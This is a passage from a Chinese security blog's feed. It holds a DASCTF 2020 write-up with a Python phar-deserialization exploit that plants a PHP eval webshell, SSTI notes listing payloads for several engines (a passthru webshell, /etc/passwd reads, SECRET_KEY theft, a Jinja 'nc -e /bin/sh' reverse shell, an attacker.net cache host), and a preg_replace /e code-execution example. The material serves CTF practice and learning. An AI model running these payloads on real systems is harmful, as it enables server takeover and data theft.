punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>可以看到<code>content</code>为<code>gyycoming</code>，之后变量覆盖<code>gyycoming</code>为一句话木马，生成.php文件，即可成功getshell</p><p>还有更好的方法，直接<code>content</code>为一句话木马，<code>pattern</code>直接删掉，既然可以phar反序列化，就有很多姿势了。</p><p>首先用<code>php://input</code>伪协议上传phar文件。</p><p><code>./tp=1&amp;var[template][1]=php://input</code>，POST上传phar</p><p>然后触发phar文件，利用<code>phar://</code>伪协议</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy"><p>可以看到第一个是正常的文件，第二个是触发phar反序列化写入的.php文件，蚁剑连上，到根目录执行<code>/readflag</code>即可。</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy"><p>所以直接读是不可以的，<code>400</code>没有权限，需要执行<code>/readflag</code>。</p><p>最后附上exp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/25 14:24@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h4><p>签到题</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy"><p>首先拿到一张图片，随便扫了一个，竟然是招式名称…不过既然是题目，图片肯定不止是图片…用十六进制查看，底部发现了zip标志头<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy"><p>用foremost提前或者直接拖到最后新建十六进制文件搞出来，是个压缩包</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy"><p>有加密，所以检查一下，发现有伪加密，直接修改加密位拖出来jpg文件，其他两个是真加密</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy"><p>图片很花，不过依稀能看出来东西的</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy"><p>所以利用Stegsolve，把这张和原图异或一下即可</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>那这串去解密真加密文件<code>c57988283c92f759585a0c1aebfdd743</code>，密码正确。</p><p>这里有人说明文攻击也行…没跑过，大概可以吧。</p><p>文本文件里一堆<code>左正蹬 右鞭腿 左刺拳</code>，第二个里面</p><pre class="language-none"><code class="language-none">左正蹬 -&gt; .右鞭腿 -&gt; !左刺拳 -&gt; ?</code></pre><p>很显然，替换。替换完后只有<code>.!?</code>，推测为Ook!加密，直接去解，得到flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RAR压缩包注释提示密码为1???小写字母，共四位</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy"><p>输出个字典用ARPA准备跑，结果提示这不是个RAR文件，则为RAR5格式，利用hashcat破解，得到密码<code>1cpp</code></p><p>解压后一个图片一个提示</p><pre class="language-none"><code class="language-none">10132430取最前面500位就行</code></pre><p>Stegsolve分析一波无果，提示也一头雾水。最后在十六进制查看在文件末尾时发现提示</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy"><p>分析到这没做了，电脑有问题没装上PIL模块。</p><p>赛后参考<a href="https://l1near.top/index.php/2020/12/27/87.html">大师傅博客</a>，利用脚本跑出Alpha通道前几个点，发现</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy"><p> 都是2的倍数，且倍数都不大。结合前面的提示（而且提示的长度还为8）。那么就猜测提示的作用是这样的：<code>10132430</code>得这样分<code>1 0 1 3 2 4 3 0</code>，然后这8个为一轮一直循环。如果刚好轮到这个数，算出来的<code>pow(2,x)</code>和Alpha通道的值一样，那么就为1，否则就为0。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>跑出来<codecode></p><p>去二进制转字符串，得到flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了，有些点还是比较生疏，重点学习了一波phar反序列化，继续学习。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2020DASCTF-Write-up&quot;&gt;&lt;a href=&quot;#2020DASCTF-Write-up&quot; class=&quot;headerlink&quot; title=&quot;2020DASCTF Write-up&quot;&gt;&lt;/a&gt;2020DASCTF Write-up&lt;/h2&gt;&lt;p&gt;队伍名称：Test1024&lt;/p&gt;
&lt;p&gt;队伍成员：&lt;/p&gt;
&lt;p&gt;gyy，Trick，X06&lt;/p&gt;
&lt;p&gt;队伍情况：&lt;/p&gt;
&lt;hr&gt;
&lt;img src=&quot;/article/dasctf2020/image-20201226160717993.png&quot; class=&quot;&quot; title&gt;

&lt;img src=&quot;/article/dasctf2020/image-20201226160703650.png&quot; class=&quot;&quot; title=&quot;range&quot;&gt;

&lt;hr&gt;
&lt;p&gt;继续学习吧，还是太菜了&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
    <category term="Python" scheme="https://err0r.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="https://err0r.top/article/ssti/"/>
    <id>https://err0r.top/article/ssti/</id>
    <published>2020-12-13T06:58:27.000Z</published>
    <updated>2020-12-15T03:58:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>SSTI模板注入</p><a id="more"></a><h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><h2 id="什么是模板注入"><a href="#什么是模板注入" class="headerlink" title="什么是模板注入"></a>什么是模板注入</h2><p> SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是。这种模板不仅存于Python中，PHP中也有不少模板引擎。</p><h2 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTI流程" loading="lazy"><p>首先输入<code>&#123;&#123;7*7&#125;&#125;</code>，返回值为<code>49</code>则表明存在SSTI</p><p>输入<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>如果返回值则表明为<strong>Smarty模板引擎</strong></p><p>输入<code>&#123;&#123;7*'7'&#125;&#125;</code>如果返回值是<code>49</code>则为<strong>Twig模板引擎</strong></p><p>如果返回值是<code>7777777</code>则为<strong>JinJa模板引擎</strong></p><hr><h2 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payload：</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;写文件&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;&#x2F;&#x2F;加载system&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;&#x2F;&#x2F;执行命令反弹SHELL</code></pre><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>payload:</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;ip:port&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;SSTI模板注入&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SSTI" scheme="https://err0r.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>preg_replace与代码执行</title>
    <link href="https://err0r.top/article/preg_replace/"/>
    <id>https://err0r.top/article/preg_replace/</id>
    <published>2020-12-10T05:53:27.000Z</published>
    <updated>2021-03-30T11:48:37.373Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章链接： <a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a> </p><a id="more"></a><h1 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h1><p> <strong>preg_replace</strong> <strong>/e</strong> 模式下的代码执行问题 </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">')/ei'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p> <strong>preg_replace</strong> 使用了 <strong>/e</strong> 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。 </p><p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串.</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong> 结果，当中的 <strong>\1</strong> 实际上就是 <strong>\1</strong> ，而 <strong>\1</strong> 在正则表达式中有自己的含义。</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p> <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。 </p><pre class="language-none"><code class="language-none">$re&#x3D;.*$str&#x3D;&#123;$&#123;phpinfo()&#125;&#125;原先的语句： preg_replace(&#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $str);变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;phpinfo()&#125;&#125;);</code></pre><hr><p> 